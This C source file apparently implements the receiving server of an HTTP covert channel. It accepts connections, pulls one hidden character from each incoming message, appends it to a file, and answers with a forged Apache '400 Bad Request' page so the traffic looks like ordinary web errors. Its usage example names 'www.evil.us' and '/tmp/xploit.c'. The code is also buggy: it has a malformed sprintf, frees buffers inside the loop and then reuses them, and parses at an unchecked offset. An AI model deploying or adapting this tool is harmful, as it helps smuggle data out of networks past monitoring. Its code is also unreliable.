#include "server.h"

int main(int argc, char *argv[])
{
	int sockfd, new_fd, numbytes = 0;  
	struct sockaddr_in my_addr;
	struct sockaddr_in their_addr;
	int sin_size, rec, ch;
	char *buf = (char *)malloc(2048*sizeof(char));
	char *respons = (char *)malloc(1024*sizeof(char));
	char localdns[81];
	FILE *output;
	
	if (argc != 3) {
        fprintf(stderr,"Usage: %s LocalDNS File\n", argv[0]);
        fprintf(stderr,"Example: %s www.evil.us /tmp/xploit.c\n", argv[0]);
        fprintf(stderr,"LocalDNS must not exceed 80 characters\n\n");
        exit(1);
    }
    
   strncpy(localdns, argv[1], 80);
   
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
	    perror("socket");
	    exit(1);
	}
	my_addr.sin_family = AF_INET;         /* host byte order */
	my_addr.sin_port = htons(MYPORT);     /* short, network byte order */
	my_addr.sin_addr.s_addr = INADDR_ANY; /* auto-fill with my IP */
	bzero(&(my_addr.sin_zero), 8);        /* zero the rest of the struct */
	
	if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1){
	    perror("bind");
	    exit(1);
	}
	
	if (listen(sockfd, BACKLOG) == -1) {
	    perror("listen");
	    exit(1);
	}
	if((output=fopen(argv[2],"wb"))== NULL) {
	  printf("I cannot open the file %s for writing\n",argv[2]);
	  exit(1);
	}
	while(1) {  /* main accept() loop */
	    sin_size = sizeof(struct sockaddr_in);
	    if ((new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size))==-1){ 
	        perror("accept");
	        exit(1);
	    }
	    printf("server: got connection from %s\n", inet_ntoa(their_addr.sin_addr)); 
	    while ((read(new_fd, buf, MAXDATASIZE)) != 0) {
	    	sprintf(buf, "%s"+'\0', buf);
	    	ch = ParseResp(buf);
	    	fprintf(output,"%c",ch);
	      fflush(output);
	    	memset(buf, 0, strlen(buf));
	    	respons = CreateQuery(localdns);
	      if (send(new_fd, respons, strlen(respons), 0) == -1)
	            perror("send");
	    	}
	    	 
	        /*exit(0);*/
	    close(new_fd);
	    free(respons);
	    free(buf);
	    }
	    fclose(output);
	}


char *CreateQuery(char *host) {
	 char *header = (char *)malloc(1024*sizeof(char)), *data = (char *)malloc(1024*sizeof(char));
	 char *tmp = (char *)malloc(1024*sizeof(char));
	 
	 sprintf(data,
	 "17c\r\n"
	 "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n"
	 "<HTML><HEAD>\r\n"
	 "<TITLE>400 Bad Request</TITLE>\r\n"
	 "</HEAD><BODY>\r\n"
	 "<H1>Bad Request</H1>\r\n"
	 "Your browser sent a request that this server could not understand.<P>\r\n"
	 "Request header field is missing colon separator.<P>\r\n"
	 "<PRE>\r\n"
	 "Host %s</PRE>\r\n"
	 "<P>\r\n"
	 "<HR>\r\n"
	 "<ADDRESS>Apache/1.3.27 Server at %s Port 80</ADDRESS>\r\n"
	 "</BODY></HTML>\r\n"
	 "\r\n"
	 "0\r\n", host, host);
	 
    sprintf(header,
    "HTTP/1.1 400 Bad Request\r\n"
	 "Date: Mon, 26 Jul 2004 11:07:48 GMT\r\n"
	 "Server: Apache/1.3.27 (Unix) mod_tsunami/1.1 AuthMySQL/2.20\r\n"
	 "Connection: close\r\n"
	 "Transfer-Encoding: chunked\r\n"
	 "Content-Type: text/html; charset=iso-8859-1\r\n"
    "\r\n");
    sprintf(tmp,"%s%s",header,data);
    free(header);
    free(data);
    return (tmp);
}


int ParseResp(char *query) {
	 char *result = (char *)malloc(24 * sizeof(char));
	 unsigned short ch;
	 
	 memcpy(result, query+strlen(query)-7, 8);
	 ch = atoi(result);
	 printf("Received: %c\n", ch);
	 free(result);
	 return ch;
}


